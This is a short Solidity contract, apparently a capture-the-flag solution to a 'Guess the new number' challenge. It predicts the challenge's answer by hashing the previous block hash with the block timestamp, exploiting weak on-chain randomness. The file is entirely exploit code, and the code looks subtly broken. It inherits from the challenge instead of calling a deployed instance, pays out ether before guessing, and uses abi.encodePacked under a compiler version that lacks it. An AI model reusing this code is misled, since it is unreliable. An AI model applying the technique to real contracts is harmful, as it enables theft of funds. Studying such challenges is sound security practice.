 pragma solidity ^0.4.21;

import "./GuessTheNewNumber.sol";

contract hack is GuessTheNewNumberChallenge{
    function solve() public payable {
        (msg.sender).transfer(1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        GuessTheNewNumberChallenge.guess(answer);
        
    }

}